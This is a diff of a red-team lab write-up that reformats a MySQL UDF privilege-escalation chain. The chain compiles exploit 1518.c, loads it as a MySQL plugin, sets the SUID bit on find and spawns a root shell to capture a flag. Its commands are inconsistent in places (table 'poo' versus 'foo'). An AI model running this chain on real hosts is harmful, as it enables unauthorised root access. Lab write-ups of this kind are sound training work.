@@ -172,23 +172,23 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - priveledge escalation
    - flag4{df2bc5e951d91581467bb9a2a8ff4425}
     - signed into mysql with credentials from last activity
-           - enumerated the mysql for version number
-           - after running linenum and outside research I foudn the machine is vulnerable to udf dynamic library exploit 1518.c
-                - searchsploit –m 1518.c
-                 -gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc
-                 -Setup python simple server to transfer 1518.so payload to ovictim machine
-                 -mysql -u root -p
-                 -use mysql;
-                 -create table poo(line blob);
-                  -insert into poo values(load_file('/tmp/1518.so'));
-                  -select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
-                  -create function do_system returns integer soname '1518.so';
-                  -select do_system('chmod u+s /usr/bin/find');
-                -now we head back to the /tmp directory
-                  -touch raj
-                    find raj –exec "whoami" \;
-                    find raj –exec "/bin/sh" \;
-                    cd /root
-                    ls
-                    cat flag4.txt
+    - enumerated the mysql for version number
+    - after running linenum and outside research I foudn the machine is vulnerable to udf dynamic library exploit 1518.c
+    - searchsploit –m 1518.c
+    -`gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc`
+    -Setup python simple server to transfer 1518.so payload to ovictim machine
+    -mysql -u root -p
+     -use mysql;
+      create table poo(line blob);
+     -insert into poo values(load_file('/tmp/1518.so'));
+     -select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
+     -create function do_system returns integer soname '1518.so';
+     -select do_system('chmod u+s /usr/bin/find');
+     -now we head back to the /tmp directory
+      -touch raj
+     ``find raj –exec "whoami" \;
+     find raj –exec "/bin/sh" \;
+     cd /root
+      ls
+     cat flag4.txt```
    
